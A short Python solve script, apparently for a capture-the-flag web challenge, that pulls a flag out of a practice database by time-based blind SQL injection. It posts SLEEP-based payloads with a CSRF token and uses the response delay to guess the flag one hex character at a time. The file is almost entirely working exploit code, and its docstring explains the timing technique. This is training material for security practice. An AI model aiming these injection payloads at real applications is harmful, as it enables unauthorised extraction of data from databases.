#!/usr/bin/env python3
"""
Similarly to blind injection here I had to go through dictionary as well but this time the database wasn't returning anything.
So, the approach here is to check if it was taking more than 1 second for database to respond. If it was, then the character is exactly what I need.
Shit.
"""
import requests
import binascii
from time import time

class Injection:
    def __init__(self, host):
        self.session = requests.Session()
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token()

    def _refresh_csrf_token(self):
        response = self.session.get(self.base_url + 'get_token')
        response = response.json()
        self.token = response['token']

    def _do_raw_request(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query}
        return self.session.post(url, json = data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_request(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_request(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_request(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_request(url, query)
        return response['result'], response['sql_error']

inj = Injection("http://web-17.challs.olicyber.it/")
result = ""
dict = "0123456789abcdef"

while True:
    for ch in dict: 
        payload = f"1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{result + ch}%')='1"
        start = time()
        response, error = inj.time(payload)
        print(payload)
        elapsed = time() - start
        if elapsed > 1:
            result += ch
            print(result)
            break
    else:
        break

print(bytes.fromhex(result))
